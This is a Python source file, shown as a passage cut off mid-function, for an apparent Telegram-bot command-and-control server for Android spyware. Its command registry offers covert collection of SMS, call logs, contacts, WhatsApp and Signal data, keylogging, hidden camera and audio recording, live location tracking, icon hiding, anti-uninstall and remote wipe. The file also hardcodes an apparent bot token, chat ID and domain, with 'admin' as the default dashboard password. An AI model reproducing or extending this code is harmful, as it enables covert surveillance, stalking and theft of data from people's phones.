#!/usr/bin/env python3
"""
Abu-Zahra Server - Complete Telegram Bot with Web Dashboard
200+ commands, REST API, getUpdates polling, professional web dashboard.
Uses ONLY aiohttp - no other dependencies besides Python stdlib.
"""

import asyncio
import json
import os
import sys
import time
import uuid
import secrets
import hashlib
import logging
import traceback
from datetime import datetime, timezone, timedelta
from pathlib import Path
from urllib.parse import urlparse, parse_qs
from collections import OrderedDict

import aiohttp
from aiohttp import web

# ============================================================================
# CONFIGURATION
# ============================================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8898830696:AAGhrsmavkljSpF8d9SUw1XbM5syh4nzGF4")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "7344776596"))
SERVER_PORT = int(os.environ.get("SERVER_PORT", "8443"))
SERVER_DOMAIN = os.environ.get("SERVER_DOMAIN", "https://alsydyabwalzhra.online")
SESSION_SECRET = os.environ.get("SESSION_SECRET", "abu-zahra-secret-key-2025")
DATA_DIR = Path(__file__).parent / "data"

DEVICES_FILE = DATA_DIR / "devices.json"
SESSIONS_FILE = DATA_DIR / "sessions.json"
COMMANDS_FILE = DATA_DIR / "commands.json"
EVENTS_FILE = DATA_DIR / "events.json"
SETTINGS_FILE = DATA_DIR / "settings.json"
LINK_CODES_FILE = DATA_DIR / "link_codes.json"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("abu-zahra")

# ============================================================================
# GLOBAL STATE
# ============================================================================

START_TIME = time.time()
messages_sent = 0
api_hits = 0
tg_offset = 0
_tg_session = None
polling_active = False
server_settings = {}
_processed_update_ids = set()  # منع تكرار معالجة نفس التحديث
_last_message_time = {}  # منع إرسال رسائل مكررة (chat_id -> last_msg_time)
_last_link_code_time = 0  # منع إنشاء أكواد مكررة

# حد أدنى بين رسائل البوت لنفس المحادثة (بالثواني)
RATE_LIMIT_SECONDS = 1
# حد أدنى بين إنشاء أكواد الربط (بالثواني)
LINK_CODE_RATE_LIMIT = 3

# ============================================================================
# 200+ COMMAND REGISTRY - organized by category
# ============================================================================

COMMAND_REGISTRY = {
    # Data Collection (20)
    "sms":              {"cat": "data",    "cmd": "get_sms",              "desc": "📲 جلب الرسائل SMS",            "emoji": "📲"},
    "calls":            {"cat": "data",    "cmd": "get_calls",            "desc": "📞 جلب سجل المكالمات",          "emoji": "📞"},
    "contacts":         {"cat": "data",    "cmd": "get_contacts",         "desc": "📇 جلب جهات الاتصال",            "emoji": "📇"},
    "location":         {"cat": "data",    "cmd": "get_location",         "desc": "📍 جلب الموقع الجغرافي",        "emoji": "📍"},
    "notifications":    {"cat": "data",    "cmd": "get_notifications",    "desc": "🔔 جلب الإشعارات",              "emoji": "🔔"},
    "apps":             {"cat": "data",    "cmd": "get_apps",             "desc": "📱 جلب التطبيقات المثبتة",      "emoji": "📱"},
    "info":             {"cat": "data",    "cmd": "get_info",             "desc": "ℹ️ معلومات الجهاز",             "emoji": "ℹ️"},
    "battery":          {"cat": "data",    "cmd": "get_battery",          "desc": "🔋 حالة البطارية",              "emoji": "🔋"},
    "gallery":          {"cat": "data",    "cmd": "get_gallery",          "desc": "🖼️ المعرض",                     "emoji": "🖼️"},
    "clipboard":        {"cat": "data",    "cmd": "get_clipboard",        "desc": "📋 الحافظة",                    "emoji": "📋"},
    "all_data":         {"cat": "data",    "cmd": "get_all_data",         "desc": "📥 جميع البيانات",               "emoji": "📥"},
    "wifi_info":        {"cat": "data",    "cmd": "get_wifi_info",        "desc": "📶 معلومات الواي فاي",          "emoji": "📶"},
    "bluetooth_devices":{"cat": "data",    "cmd": "get_bluetooth",        "desc": "🔵 أجهزة البلوتوث",             "emoji": "🔵"},
    "network_info":     {"cat": "data",    "cmd": "get_network_info",     "desc": "🌐 معلومات الشبكة",             "emoji": "🌐"},
    "sim_info":         {"cat": "data",    "cmd": "get_sim_info",         "desc": "📱 معلومات الشريحة",            "emoji": "📱"},
    "storage_info":     {"cat": "data",    "cmd": "get_storage_info",     "desc": "💾 معلومات التخزين",            "emoji": "💾"},
    "installed_apps":   {"cat": "data",    "cmd": "get_installed_apps",   "desc": "📦 التطبيقات المثبتة",          "emoji": "📦"},
    "running_apps":     {"cat": "data",    "cmd": "get_running_apps",     "desc": "⚡ التطبيقات النشطة",           "emoji": "⚡"},
    "calendar":         {"cat": "data",    "cmd": "get_calendar",         "desc": "📅 التقويم",                    "emoji": "📅"},
    "browser_history":  {"cat": "data",    "cmd": "get_browser_history",  "desc": "🌍 سجل المتصفح",               "emoji": "🌍"},

    # Social Media (15)
    "whatsapp":         {"cat": "social",  "cmd": "get_whatsapp",         "desc": "💬 واتساب",                     "emoji": "💬"},
    "telegram_app":     {"cat": "social",  "cmd": "get_telegram",         "desc": "✈️ تليجرام",                    "emoji": "✈️"},
    "instagram":        {"cat": "social",  "cmd": "get_instagram",        "desc": "📷 انستجرام",                   "emoji": "📷"},
    "messenger":        {"cat": "social",  "cmd": "get_messenger",        "desc": "📘 ماسنجر",                     "emoji": "📘"},
    "snapchat":         {"cat": "social",  "cmd": "get_snapchat",         "desc": "👻 سناب شات",                   "emoji": "👻"},
    "tiktok":           {"cat": "social",  "cmd": "get_tiktok",           "desc": "🎵 تيك توك",                    "emoji": "🎵"},
    "twitter":          {"cat": "social",  "cmd": "get_twitter",          "desc": "🐦 تويتر / X",                  "emoji": "🐦"},
    "viber":            {"cat": "social",  "cmd": "get_viber",            "desc": "💜 فايبر",                      "emoji": "💜"},
    "signal":           {"cat": "social",  "cmd": "get_signal",           "desc": "🟢 سيجنال",                     "emoji": "🟢"},
    "facebook":         {"cat": "social",  "cmd": "get_facebook",         "desc": "📘 فيسبوك",                     "emoji": "📘"},
    "whatsapp_status":  {"cat": "social",  "cmd": "get_whatsapp_status",  "desc": "📝 حالات واتساب",              "emoji": "📝"},
    "whatsapp_stories": {"cat": "social",  "cmd": "get_whatsapp_stories", "desc": "📖 قصص واتساب",                "emoji": "📖"},
    "telegram_channels":{"cat": "social",  "cmd": "get_telegram_channels","desc": "📺 قنوات تليجرام",             "emoji": "📺"},
    "instagram_stories":{"cat": "social",  "cmd": "get_instagram_stories","desc": "📸 قصص انستجرام",              "emoji": "📸"},
    "youtube":          {"cat": "social",  "cmd": "get_youtube",          "desc": "▶️ يوتيوب",                     "emoji": "▶️"},

    # Remote Control (40)
    "ping":             {"cat": "control", "cmd": "ping",                 "desc": "📡 فحص الاتصال",               "emoji": "📡"},
    "vibrate":          {"cat": "control", "cmd": "vibrate",              "desc": "📳 اهتزاز",                     "emoji": "📳"},
    "ring":             {"cat": "control", "cmd": "ring",                 "desc": "🔔 رنين",                      "emoji": "🔔"},
    "screenshot":       {"cat": "control", "cmd": "screenshot",           "desc": "📸 لقطة شاشة",                 "emoji": "📸"},
    "front_camera":     {"cat": "control", "cmd": "front_camera",         "desc": "📷 كاميرا أمامية",             "emoji": "📷"},
    "back_camera":      {"cat": "control", "cmd": "back_camera",          "desc": "📷 كاميرا خلفية",              "emoji": "📷"},
    "record_audio":     {"cat": "control", "cmd": "record_audio",         "desc": "🎙️ تسجيل صوتي",               "emoji": "🎙️"},
    "record_video":     {"cat": "control", "cmd": "record_video",         "desc": "🎬 تسجيل فيديو",               "emoji": "🎬"},
    "lock_phone":       {"cat": "control", "cmd": "lock_phone",           "desc": "🔒 قفل الهاتف",                "emoji": "🔒"},
    "unlock_phone":     {"cat": "control", "cmd": "unlock_phone",         "desc": "🔓 فتح الهاتف",                "emoji": "🔓"},
    "reboot":           {"cat": "control", "cmd": "reboot",               "desc": "🔄 إعادة تشغيل",              "emoji": "🔄"},
    "shutdown":         {"cat": "control", "cmd": "shutdown",             "desc": "⏻ إيقاف التشغيل",             "emoji": "⏻"},
    "set_volume":       {"cat": "control", "cmd": "set_volume",           "desc": "🔊 تعيين الصوت",               "emoji": "🔊"},
    "set_brightness":   {"cat": "control", "cmd": "set_brightness",       "desc": "☀️ تعيين السطوع",              "emoji": "☀️"},
    "set_ringtone":     {"cat": "control", "cmd": "set_ringtone",         "desc": "🔔 تعيين النغمة",               "emoji": "🔔"},
    "set_wallpaper":    {"cat": "control", "cmd": "set_wallpaper",        "desc": "🖼️ تعيين الخلفية",             "emoji": "🖼️"},
    "enable_wifi":      {"cat": "control", "cmd": "enable_wifi",          "desc": "📶 تشغيل الواي فاي",           "emoji": "📶"},
    "disable_wifi":     {"cat": "control", "cmd": "disable_wifi",         "desc": "📵 إيقاف الواي فاي",           "emoji": "📵"},
    "enable_bluetooth": {"cat": "control", "cmd": "enable_bluetooth",     "desc": "🔵 تشغيل البلوتوث",            "emoji": "🔵"},
    "disable_bluetooth":{"cat": "control", "cmd": "disable_bluetooth",    "desc": "❌ إيقاف البلوتوث",            "emoji": "❌"},
    "enable_mobile_data":{"cat": "control","cmd": "enable_mobile_data",   "desc": "📶 تشغيل بيانات الجوال",       "emoji": "📶"},
    "disable_mobile_data":{"cat":"control","cmd": "disable_mobile_data",  "desc": "📵 إيقاف بيانات الجوال",       "emoji": "📵"},
    "enable_hotspot":   {"cat": "control", "cmd": "enable_hotspot",       "desc": "📡 تشغيل نقطة الاتصال",        "emoji": "📡"},
    "disable_hotspot":  {"cat": "control", "cmd": "disable_hotspot",      "desc": "📵 إيقاف نقطة الاتصال",        "emoji": "📵"},
    "airplane_on":      {"cat": "control", "cmd": "airplane_on",          "desc": "✈️ وضع الطيران - تشغيل",      "emoji": "✈️"},
    "airplane_off":     {"cat": "control", "cmd": "airplane_off",         "desc": "📱 وضع الطيران - إيقاف",      "emoji": "📱"},
    "auto_rotate_on":   {"cat": "control", "cmd": "auto_rotate_on",       "desc": "🔄 الدوران التلقائي - تشغيل", "emoji": "🔄"},
    "auto_rotate_off":  {"cat": "control", "cmd": "auto_rotate_off",      "desc": "🔒 الدوران التلقائي - إيقاف", "emoji": "🔒"},
    "torch_on":         {"cat": "control", "cmd": "torch_on",             "desc": "🔦 تشغيل الكشاف",              "emoji": "🔦"},
    "torch_off":        {"cat": "control", "cmd": "torch_off",            "desc": "🔦 إطفاء الكشاف",              "emoji": "🔦"},
    "play_sound":       {"cat": "control", "cmd": "play_sound",           "desc": "🔊 تشغيل صوت",                "emoji": "🔊"},
    "speak_text":       {"cat": "control", "cmd": "speak_text",           "desc": "🗣️ نطق نص",                   "emoji": "🗣️"},
    "show_notification":{"cat": "control", "cmd": "show_notification",    "desc": "🔔 إظهار إشعار",              "emoji": "🔔"},
    "open_url":         {"cat": "control", "cmd": "open_url",             "desc": "🌐 فتح رابط",                  "emoji": "🌐"},
    "send_sms":         {"cat": "control", "cmd": "send_sms",             "desc": "📲 إرسال رسالة SMS",           "emoji": "📲"},
    "make_call":        {"cat": "control", "cmd": "make_call",            "desc": "📞 إجراء مكالمة",              "emoji": "📞"},
    "block_number":     {"cat": "control", "cmd": "block_number",         "desc": "🚫 حظر رقم",                  "emoji": "🚫"},
    "unblock_number":   {"cat": "control", "cmd": "unblock_number",       "desc": "✅ إلغاء حظر رقم",             "emoji": "✅"},

    # App Management (20)
    "open_app":         {"cat": "apps",    "cmd": "open_app",             "desc": "📱 فتح تطبيق",                 "emoji": "📱"},
    "close_app":        {"cat": "apps",    "cmd": "close_app",            "desc": "❌ إغلاق تطبيق",               "emoji": "❌"},
    "install_app":      {"cat": "apps",    "cmd": "install_app",          "desc": "📥 تثبيت تطبيق",               "emoji": "📥"},
    "uninstall_app":    {"cat": "apps",    "cmd": "uninstall_app",        "desc": "🗑️ حذف تطبيق",                "emoji": "🗑️"},
    "block_app":        {"cat": "apps",    "cmd": "block_app",            "desc": "🚫 حظر تطبيق",                "emoji": "🚫"},
    "unblock_app":      {"cat": "apps",    "cmd": "unblock_app",          "desc": "✅ إلغاء حظر تطبيق",           "emoji": "✅"},
    "clear_app_data":   {"cat": "apps",    "cmd": "clear_app_data",       "desc": "🧹 مسح بيانات تطبيق",         "emoji": "🧹"},
    "force_stop_app":   {"cat": "apps",    "cmd": "force_stop_app",       "desc": "⛔ إيقاف قسري",               "emoji": "⛔"},
    "app_info":         {"cat": "apps",    "cmd": "app_info",             "desc": "ℹ️ معلومات تطبيق",            "emoji": "ℹ️"},
    "app_usage":        {"cat": "apps",    "cmd": "app_usage",            "desc": "📊 استخدام التطبيقات",        "emoji": "📊"},
    "screen_time":      {"cat": "apps",    "cmd": "screen_time",          "desc": "⏱️ وقت الشاشة",               "emoji": "⏱️"},
    "app_permissions":  {"cat": "apps",    "cmd": "app_permissions",      "desc": "🔐 صلاحيات التطبيق",          "emoji": "🔐"},
    "enable_app":       {"cat": "apps",    "cmd": "enable_app",           "desc": "✅ تفعيل تطبيق",              "emoji": "✅"},
    "disable_app":      {"cat": "apps",    "cmd": "disable_app",          "desc": "❌ تعطيل تطبيق",              "emoji": "❌"},
    "list_blocked":     {"cat": "apps",    "cmd": "list_blocked",         "desc": "📋 قائمة التطبيقات المحظورة",  "emoji": "📋"},
    "clear_cache":      {"cat": "apps",    "cmd": "clear_cache",          "desc": "🧹 مسح الكاش",                "emoji": "🧹"},
    "update_app":       {"cat": "apps",    "cmd": "update_app",           "desc": "⬆️ تحديث تطبيق",              "emoji": "⬆️"},
    "launch_app":       {"cat": "apps",    "cmd": "launch_app",           "desc": "🚀 تشغيل تطبيق",              "emoji": "🚀"},
    "kill_app":         {"cat": "apps",    "cmd": "kill_app",             "desc": "💀 إنهاء تطبيق",               "emoji": "💀"},
    "app_cache":        {"cat": "apps",    "cmd": "app_cache",            "desc": "💾 كاش التطبيقات",             "emoji": "💾"},

    # File Management (25)
    "list_files":       {"cat": "files",   "cmd": "list_files",           "desc": "📂 عرض الملفات",               "emoji": "📂"},
    "get_file":         {"cat": "files",   "cmd": "get_file",             "desc": "📄 جلب ملف",                  "emoji": "📄"},
    "download_file":    {"cat": "files",   "cmd": "download_file",        "desc": "⬇️ تحميل ملف",                "emoji": "⬇️"},
    "list_downloads":   {"cat": "files",   "cmd": "list_downloads",       "desc": "📥 مجلد التحميلات",            "emoji": "📥"},
    "list_dcim":        {"cat": "files",   "cmd": "list_dcim",            "desc": "📸 مجلد DCIM",                "emoji": "📸"},
    "list_music":       {"cat": "files",   "cmd": "list_music",           "desc": "🎵 مجلد الموسيقى",            "emoji": "🎵"},
    "list_videos":      {"cat": "files",   "cmd": "list_videos",          "desc": "🎬 مجلد الفيديوهات",          "emoji": "🎬"},
    "list_documents":   {"cat": "files",   "cmd": "list_documents",       "desc": "📁 مجلد المستندات",            "emoji": "📁"},
    "list_whatsapp":    {"cat": "files",   "cmd": "list_whatsapp_files",  "desc": "💬 ملفات واتساب",             "emoji": "💬"},
    "list_telegram_files":{"cat":"files",  "cmd": "list_telegram_files",  "desc": "✈️ ملفات تليجرام",            "emoji": "✈️"},
    "send_contacts_backup":{"cat":"files", "cmd": "send_contacts_backup", "desc": "📇 نسخة جهات الاتصال",          "emoji": "📇"},
    "send_sms_backup":  {"cat": "files",   "cmd": "send_sms_backup",      "desc": "📲 نسخة الرسائل",              "emoji": "📲"},
    "send_calls_backup":{"cat": "files",   "cmd": "send_calls_backup",    "desc": "📞 نسخة المكالمات",            "emoji": "📞"},
    "send_whatsapp_backup":{"cat":"files", "cmd": "send_whatsapp_backup", "desc": "💬 نسخة واتساب",               "emoji": "💬"},
    "send_full_backup": {"cat": "files",   "cmd": "send_full_backup",     "desc": "💾 نسخة احتياطية كاملة",       "emoji": "💾"},
    "delete_file":      {"cat": "files",   "cmd": "delete_file",          "desc": "🗑️ حذف ملف",                  "emoji": "🗑️"},
    "rename_file":      {"cat": "files",   "cmd": "rename_file",          "desc": "✏️ إعادة تسمية ملف",          "emoji": "✏️"},
    "copy_file":        {"cat": "files",   "cmd": "copy_file",            "desc": "📋 نسخ ملف",                  "emoji": "📋"},
    "move_file":        {"cat": "files",   "cmd": "move_file",            "desc": "📦 نقل ملف",                  "emoji": "📦"},
    "create_folder":    {"cat": "files",   "cmd": "create_folder",        "desc": "📁 إنشاء مجلد",               "emoji": "📁"},
    "get_folder_size":  {"cat": "files",   "cmd": "get_folder_size",      "desc": "📏 حجم المجلد",               "emoji": "📏"},
    "search_files":     {"cat": "files",   "cmd": "search_files",         "desc": "🔍 بحث في الملفات",           "emoji": "🔍"},
    "recent_files":     {"cat": "files",   "cmd": "recent_files",         "desc": "🕐 الملفات الأخيرة",           "emoji": "🕐"},
    "file_info":        {"cat": "files",   "cmd": "file_info",            "desc": "ℹ️ معلومات ملف",              "emoji": "ℹ️"},
    "zip_files":        {"cat": "files",   "cmd": "zip_files",            "desc": "📦 ضغط ملفات",                "emoji": "📦"},

    # Security & Admin (15)
    "wipe_data":        {"cat": "security","cmd": "wipe_data",            "desc": "💣 مسح البيانات",              "emoji": "💣"},
    "factory_reset":    {"cat": "security","cmd": "factory_reset",        "desc": "⚠️ إعادة ضبط المصنع",         "emoji": "⚠️"},
    "show_app":         {"cat": "security","cmd": "show_app",             "desc": "👁️ إظهار أيقونة التطبيق",     "emoji": "👁️"},
    "hide_app":         {"cat": "security","cmd": "hide_app",             "desc": "🙈 إخفاء أيقونة التطبيق",     "emoji": "🙈"},
    "change_passcode":  {"cat": "security","cmd": "change_passcode",      "desc": "🔑 تغيير رمز القفل",          "emoji": "🔑"},
    "set_pin":          {"cat": "security","cmd": "set_pin",              "desc": "🔢 تعيين رقم PIN",             "emoji": "🔢"},
    "remove_pin":       {"cat": "security","cmd": "remove_pin",           "desc": "🔓 إزالة رقم PIN",             "emoji": "🔓"},
    "enable_biometric": {"cat": "security","cmd": "enable_biometric",     "desc": "👤 تشغيل البصمة",             "emoji": "👤"},
    "disable_biometric":{"cat": "security","cmd": "disable_biometric",    "desc": "❌ إيقاف البصمة",             "emoji": "❌"},
    "anti_uninstall_on":{"cat": "security","cmd": "anti_uninstall_on",    "desc": "🛡️ الحماية من الحذف - تشغيل", "emoji": "🛡️"},
    "anti_uninstall_off":{"cat":"security","cmd": "anti_uninstall_off",   "desc": "⛔ الحماية من الحذف - إيقاف", "emoji": "⛔"},
    "device_admin_status":{"cat":"security","cmd":"device_admin_status",  "desc": "📋 حالة مسؤول الجهاز",        "emoji": "📋"},
    "check_root":       {"cat": "security","cmd": "check_root",           "desc": "🧪 فحص الروت",                "emoji": "🧪"},
    "set_screen_lock":  {"cat": "security","cmd": "set_screen_lock",      "desc": "🔒 تعيين قفل الشاشة",         "emoji": "🔒"},
    "remove_screen_lock":{"cat":"security","cmd":"remove_screen_lock",    "desc": "🔓 إزالة قفل الشاشة",         "emoji": "🔓"},

    # Monitoring (20)
    "keylogger_start":  {"cat": "monitor", "cmd": "keylogger_start",      "desc": "⌨️ بدء تسجيل المفاتيح",        "emoji": "⌨️"},
    "keylogger_stop":   {"cat": "monitor", "cmd": "keylogger_stop",       "desc": "⏹️ إيقاف تسجيل المفاتيح",     "emoji": "⏹️"},
    "get_keylogger":    {"cat": "monitor", "cmd": "get_keylogger",        "desc": "📥 جلب بيانات لوحة المفاتيح",   "emoji": "📥"},
    "screen_record_start":{"cat":"monitor","cmd":"screen_record_start",   "desc": "🔴 بدء تسجيل الشاشة",         "emoji": "🔴"},
    "screen_record_stop":{"cat": "monitor","cmd": "screen_record_stop",   "desc": "⏹️ إيقاف تسجيل الشاشة",       "emoji": "⏹️"},
    "clipboard_monitor_start":{"cat":"monitor","cmd":"clipboard_monitor_start","desc":"📋 بدء مراقبة الحافظة","emoji":"📋"},
    "clipboard_monitor_stop":{"cat":"monitor","cmd":"clipboard_monitor_stop","desc":"⏹️ إيقاف مراقبة الحافظة","emoji":"⏹️"},
    "get_clipboard_log":{"cat": "monitor", "cmd": "get_clipboard_log",    "desc": "📋 سجل الحافظة",               "emoji": "📋"},
    "wifi_monitor_start":{"cat": "monitor", "cmd": "wifi_monitor_start",  "desc": "📡 بدء مراقبة الواي فاي",     "emoji": "📡"},
    "wifi_monitor_stop":{"cat": "monitor", "cmd": "wifi_monitor_stop",   "desc": "⏹️ إيقاف مراقبة الواي فاي",   "emoji": "⏹️"},
    "app_monitor_start":{"cat": "monitor", "cmd": "app_monitor_start",    "desc": "📱 بدء مراقبة التطبيقات",      "emoji": "📱"},
    "app_monitor_stop": {"cat": "monitor", "cmd": "app_monitor_stop",     "desc": "⏹️ إيقاف مراقبة التطبيقات",   "emoji": "⏹️"},
    "get_app_log":      {"cat": "monitor", "cmd": "get_app_log",          "desc": "📋 سجل التطبيقات",             "emoji": "📋"},
    "location_live":    {"cat": "monitor", "cmd": "location_live",        "desc": "🗺️ تتبع مباشر",               "emoji": "🗺️"},
    "location_stop":    {"cat": "monitor", "cmd": "location_stop",        "desc": "⏹️ إيقاف التتبع",             "emoji": "⏹️"},
    "location_history": {"cat": "monitor", "cmd": "location_history",     "desc": "📜 سجل المواقع",              "emoji": "📜"},
    "geo_add":          {"cat": "monitor", "cmd": "geo_add",              "desc": "➕ إضافة منطقة جغرافية",       "emoji": "➕"},
    "geo_remove":       {"cat": "monitor", "cmd": "geo_remove",           "desc": "➖ حذف منطقة جغرافية",         "emoji": "➖"},
    "geo_list":         {"cat": "monitor", "cmd": "geo_list",             "desc": "📋 قائمة المناطق الجغرافية",   "emoji": "📋"},
    "sms_monitor":      {"cat": "monitor", "cmd": "sms_monitor",          "desc": "📲 مراقبة الرسائل",            "emoji": "📲"},
    "call_monitor":     {"cat": "monitor", "cmd": "call_monitor",         "desc": "📞 مراقبة المكالمات",          "emoji": "📞"},

    # System Settings (15)
    "set_language":     {"cat": "syssettings", "cmd": "set_language",     "desc": "🌐 تعيين اللغة",               "emoji": "🌐"},
    "set_timezone":     {"cat": "syssettings", "cmd": "set_timezone",     "desc": "🕐 تعيين المنطقة الزمنية",     "emoji": "🕐"},
    "set_alarm":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏰ تعيين منبه",                "emoji": "⏰"},
    "set_timer":        {"cat": "syssettings", "cmd": "set_timer",        "desc": "⏱️ تعيين مؤقت",               "emoji": "⏱️"},
    "set_reminder":     {"cat": "syssettings", "cmd": "set_reminder",     "desc": "📝 تعيين تذكير",              "emoji": "📝"},
    "enable_dev_mode":  {"cat": "syssettings", "cmd": "enable_dev_mode",  "desc": "🔧 تشغيل وضع المطور",         "emoji": "🔧"},
    "disable_dev_mode": {"cat": "syssettings", "cmd": "disable_dev_mode", "desc": "❌ إيقاف وضع المطور",         "emoji": "❌"},
    "enable_usb_debug": {"cat": "syssettings", "cmd": "enable_usb_debug", "desc": "🔌 تشغيل تصحيح USB",          "emoji": "🔌"},
    "disable_usb_debug":{"cat": "syssettings", "cmd": "disable_usb_debug","desc": "❌ إيقاف تصحيح USB",          "emoji": "❌"},
    "dns_change":       {"cat": "syssettings", "cmd": "dns_change",       "desc": "🌐 تغيير DNS",               "emoji": "🌐"},
    "proxy_set":        {"cat": "syssettings", "cmd": "proxy_set",        "desc": "🔀 تعيين بروكسي",             "emoji": "🔀"},
    "apn_settings":     {"cat": "syssettings", "cmd": "apn_settings",     "desc": "📶 إعدادات APN",             "emoji": "📶"},
    "nfc_on":           {"cat": "syssettings", "cmd": "nfc_on",           "desc": "📡 تشغيل NFC",               "emoji": "📡"},
    "nfc_off":          {"cat": "syssettings", "cmd": "nfc_off",          "desc": "❌ إيقاف NFC",               "emoji": "❌"},
    "auto_update_on":   {"cat": "syssettings", "cmd": "auto_update_on",   "desc": "⬆️ التحديث التلقائي - تشغيل", "emoji": "⬆️"},
    "auto_update_off":  {"cat": "syssettings", "cmd": "auto_update_off",  "desc": "⏸️ التحديث التلقائي - إيقاف", "emoji": "⏸️"},
}

# ============================================================================
# DATA HELPERS
# ============================================================================

def ensure_data_dir():
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    defaults = {
        DEVICES_FILE: [],
        SESSIONS_FILE: [],
        COMMANDS_FILE: [],
        EVENTS_FILE: [],
        SETTINGS_FILE: {
            "admin_password": "admin",
            "sync_interval": 300,
            "location_interval": 60,
            "auto_location": True,
            "auto_sync": True,
            "language": "ar",
            "notifications": True,
            "keylogger": False,
            "sim_detect": False,
            "wifi_monitor": False,
            "geofences": [],
        },
        LINK_CODES_FILE: [],
    }
    for fpath, default in defaults.items():
        if not fpath.exists():
            fpath.write_text(json.dumps(default, ensure_ascii=False, indent=2))


def load_json(path, default=None):
    try:
        if path.exists():
            return json.loads(path.read_text())
    except Exception as exc:
        log.error("Failed to load %s: %s", path, exc)
    return default if default is not None else []


def save_json(path, data):
    try:
        path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
    except Exception as exc:
        log.error("Failed to save %s: %s", path, exc)


def append_event(event, details=None, level="info"):
    events = load_json(EVENTS_FILE, [])
    events.append({
        "time": datetime.now(timezone.utc).isoformat(),
        "event": event,
        "details": details or {},
        "level": level,
    })
    if len(events) > 2000:
        events = events[-2000:]
    save_json(EVENTS_FILE, events)


def load_settings():
    return load_json(SETTINGS_FILE, {
        "admin_password": "admin",
        "sync_interval": 300,
        "location_interval": 60,
        "auto_location": True,
        "auto_sync": True,
        "language": "ar",
        "notifications": True,
        "keylogger": False,
        "sim_detect": False,
        "wifi_monitor": False,
        "geofences": [],
    })


def save_settings_data(settings):
    save_json(SETTINGS_FILE, settings)


def ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def get_uptime():
    return int(time.time() - START_TIME)


def format_uptime(seconds):
    d = seconds // 86400
    h = (seconds % 86400) // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    parts.append(f"{s}s")
    return " ".join(parts)

# ============================================================================
# DEVICE HELPERS
# ============================================================================

def get_devices():
    return load_json(DEVICES_FILE, [])


def save_devices(devices):
    save_json(DEVICES_FILE, devices)


def find_device(device_id):
    for d in get_devices():
        if d.get("id") == device_id:
            return d
    return None


def update_device(device_id, updates):
    devices = get_devices()
    for i, d in enumerate(devices):
        if d.get("id") == device_id:
            d.update(updates)
            d["last_seen"] = ts()
            devices[i] = d
            save_devices(devices)
            return d
    return None


def add_device(device_data):
    devices = get_devices()
    for i, d in enumerate(devices):
        if d.get("id") == device_data.get("id"):
            device_data["last_seen"] = ts()
            devices[i] = device_data
            save_devices(devices)
            return device_data
    device_data["last_seen"] = ts()
    device_data["created_at"] = ts()
    devices.append(device_data)
    save_devices(devices)
    append_event("Device registered", {"id": device_data["id"], "name": device_data.get("name", "")})
    return device_data


def remove_device(device_id):
    devices = get_devices()
    new_devices = [d for d in devices if d.get("id") != device_id]
    if len(new_devices) == len(devices):
        return False
    save_devices(new_devices)
    append_event("Device removed", {"id": device_id})
    return True


def get_first_device():
    devices = get_devices()
    return devices[0] if devices else None

# ============================================================================
# COMMAND QUEUE HELPERS
# ============================================================================

def queue_command(device_id, command, params=None):
    commands = load_json(COMMANDS_FILE, [])
    cmd = {
        "id": str(uuid.uuid4())[:8],
        "device_id": device_id,
        "command": command,
        "params": params or {},
        "status": "pending",
        "created_at": ts(),
        "sent_at": None,
        "result": None,
    }
    commands.append(cmd)
    if len(commands) > 1000:
        commands = commands[-1000:]
    save_json(COMMANDS_FILE, commands)
    append_event("Command queued", {"device_id": device_id, "command": command, "cmd_id": cmd["id"]})
    return cmd


def get_pending_commands(device_id):
    commands = load_json(COMMANDS_FILE, [])
    return [c for c in commands if c.get("device_id") == device_id and c.get("status") == "pending"]


def update_command_status(cmd_id, status, result=None):
    commands = load_json(COMMANDS_FILE, [])
    for i, c in enumerate(commands):
        if c.get("id") == cmd_id:
            commands[i]["status"] = status
            commands[i]["result"] = result
            commands[i]["completed_at"] = ts()
            save_json(COMMANDS_FILE, commands)
            return commands[i]
    return None

# ============================================================================
# SESSION HELPERS
# ============================================================================

def create_session(username, password, ip="", ua=""):
    settings = load_settings()
    if password != settings.get("admin_password", "admin"):
        return None
    sessions = load_json(SESSIONS_FILE, [])
    token = secrets.token_urlsafe(32)
    session = {
        "token": token,
        "username": username,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "expires_at": (datetime.now(timezone.utc) + timedelta(hours=24)).isoformat(),
        "ip": ip,
        "user_agent": ua,
    }
    sessions.append(session)
    if len(sessions) > 100:
        sessions = sessions[-100:]
    save_json(SESSIONS_FILE, sessions)
    append_event("Web login", {"username": username, "ip": ip})
    return session


def validate_session(token):
    sessions = load_json(SESSIONS_FILE, [])
    now = datetime.now(timezone.utc)
    for s in sessions:
        if s.get("token") == token:
            try:
                expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
                if now > expires:
                    return None
            except:
                return None
            return s
    return None


def delete_session(token):
    sessions = load_json(SESSIONS_FILE, [])
    new_sessions = [s for s in sessions if s.get("token") != token]
    save_json(SESSIONS_FILE, new_sessions)

# ============================================================================
# LINK CODE HELPERS
# ============================================================================

def generate_link_code():
    codes = load_json(LINK_CODES_FILE, [])
    code = secrets.token_urlsafe(6).upper()[:8]
    now = datetime.now(timezone.utc)
    entry = {
        "code": code,
        "created_at": now.isoformat(),
        "expires_at": (now + timedelta(minutes=10)).isoformat(),
        "used": False,
        "device_id": None,
    }
    codes.append(entry)
    if len(codes) > 100:
        codes = codes[-100:]
    save_json(LINK_CODES_FILE, codes)
    append_event("Link code generated", {"code": code})
    return entry


def verify_link_code(code):
    codes = load_json(LINK_CODES_FILE, [])
    now = datetime.now(timezone.utc)
    for entry in codes:
        if entry.get("code") == code and not entry.get("used"):
            try:
                expires = datetime.fromisoformat(entry.get("expires_at", "")).replace(tzinfo=timezone.utc)
                if now > expires:
                    return {"ok": False, "error": "Code expired"}
            except:
                return {"ok": False, "error": "Invalid code"}
            return {"ok": True, "code_entry": entry}
    return {"ok": False, "error": "Invalid code"}


def consume_link_code(code, device_id):
